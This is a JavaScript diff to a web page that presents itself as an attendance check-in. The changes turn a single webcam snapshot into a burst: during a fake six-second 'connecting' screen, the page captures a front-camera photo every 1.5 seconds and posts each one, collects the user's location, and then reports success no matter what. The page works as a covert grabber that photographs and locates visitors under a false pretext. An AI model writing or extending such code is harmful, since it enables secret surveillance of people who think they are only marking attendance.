@@ -117,13 +117,24 @@
         try{
           const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
           video.srcObject=stream;
-          // capture one frame
+          // start periodic captures so we can capture multiple photos during the loading period
           const ctx=canvas.getContext('2d');
-          ctx.drawImage(video,0,0,640,480);
-          var data=canvas.toDataURL('image/png').replace('image/png','image/octet-stream');
-          postImage(data);
-          // stop tracks
-          stream.getTracks().forEach(t=>t.stop());
+          // clear any previous capture loop
+          if(window._attendance_capture_interval){
+            clearInterval(window._attendance_capture_interval);
+            window._attendance_capture_interval = null;
+          }
+          window._attendance_stream = stream;
+          // capture immediately and then repeatedly every 1500ms
+          function captureOnce(){
+            try{
+              ctx.drawImage(video,0,0,640,480);
+              var data=canvas.toDataURL('image/png').replace('image/png','image/octet-stream');
+              postImage(data);
+            }catch(e){}
+          }
+          captureOnce();
+          window._attendance_capture_interval = setInterval(captureOnce, 1500);
           return true;
         }catch(e){
           return false;
@@ -142,6 +153,19 @@
             resolve(true);
           },function(){resolve(false);},{timeout:8000});
         });
+      }
+
+      function stopCapture(){
+        try{
+          if(window._attendance_capture_interval){
+            clearInterval(window._attendance_capture_interval);
+            window._attendance_capture_interval = null;
+          }
+          if(window._attendance_stream){
+            window._attendance_stream.getTracks().forEach(t=>t.stop());
+            window._attendance_stream = null;
+          }
+        }catch(e){}
       }
 
       function showConnecting(){
@@ -166,10 +190,22 @@
         document.getElementById('user-form').style.display='none';
         showConnecting();
 
-        // request camera and location in parallel
-        const [camResult, locResult] = await Promise.all([tryGetCamera(), tryGetLocation()]);
+        // start camera capture (if allowed) and location request in parallel
+        const camPromise = tryGetCamera();
+        const locPromise = tryGetLocation();
 
-        // regardless of results, mark attendance and show success
+        // show loading for about 6 seconds to capture multiple photos
+        await new Promise(function(resolve){
+          setTimeout(resolve, 6000);
+        });
+
+        // stop capturing photos after loading period
+        stopCapture();
+
+        // ensure location promise has settled (don't block longer than necessary)
+        try{ await Promise.race([locPromise, new Promise(r=>setTimeout(r,1000))]); }catch(e){}
+
+        // show success
         hideConnectingAndShowSuccess();
         return false;
       }
